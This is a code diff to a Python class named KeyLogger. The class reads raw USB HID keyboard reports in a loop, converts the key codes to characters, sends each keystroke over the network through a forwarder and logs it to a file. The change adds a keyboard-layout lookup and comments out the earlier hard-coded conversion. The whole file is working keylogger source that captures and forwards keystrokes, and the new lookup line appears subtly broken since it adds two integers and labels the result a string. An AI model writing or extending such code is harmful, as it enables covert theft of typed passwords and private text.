@@ -5,21 +5,24 @@ from src.DataHandler import DataHandler
 from src.Forwarder import Forwarder
 import hid
 
+
 class NoDeviceFound(Exception):
     def __init__(self, devices: list = []):
         super().__init__(f"No forward device found in {devices}")
 
 
 class KeyLogger:
-    __slots__ = ["__devices", "data_handler", "__forwarder"]
+    __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]
 
-    def __init__(self, data_handler: DataHandler) -> None:
+    def __init__(self, keyboard_layout: dict[int, int], data_handler: DataHandler) -> None:
         # get all USB Devices
         self.__devices: list[int, int] = self.get_devices()
         # create a data handler
         self.data_handler = data_handler
         # create a forwarder
         self.__forwarder = Forwarder()
+        # set keyboard
+        self.keyboard_layout = keyboard_layout
 
     def __del__(self):
         pass
@@ -75,8 +78,6 @@ class KeyLogger:
         # device_id = 0xc33e
         keyboard = hid.device()
         keyboard.open(id_vendor, device_id)
-
-        # Read and process HID reports
         while True:
             try:
                 data = keyboard.read(8)  # Read an 8-byte HID report
@@ -85,18 +86,29 @@ class KeyLogger:
                 exit()
             if data:
                 key_code = data[2]  # The key code is in byte 2
-                if key_code < 30:
-                    char = chr(key_code + 93)  # Convert the key code to a character
-                elif 30 <= key_code and key_code < 49:
-                    char = chr(key_code + 19)
-                elif key_code == 39:
-                    char = chr(39 + 9)
-                else:
-                    char = "Not FOUND"
-                if char:
+                try:
+                    char: str = self.keyboard_layout[key_code] + key_code
                     try:
                         self.__forwarder.send_over_network(data=char)
                         # write data in file
                         self.data_handler.write(f'{key_code} {char}')
                     except ConnectionResetError:
                         self.__forwarder.listen()
+                except Exception as e:
+                    logging.error(f"Key {key_code} not in the layout")
+                    logging.error(e)
+                # if key_code < 30:
+                #     char = chr(key_code + 93)  # Convert the key code to a character
+                # elif 30 <= key_code and key_code < 49:
+                #     char = chr(key_code + 19)
+                # elif key_code == 39:
+                #     char = chr(39 + 9)
+                # else:
+                #     char = "Not FOUND"
+                # if char:
+                #     try:
+                #         self.__forwarder.send_over_network(data=char)
+                #         # write data in file
+                #         self.data_handler.write(f'{key_code} {char}')
+                #     except ConnectionResetError:
+                #         self.__forwarder.listen()
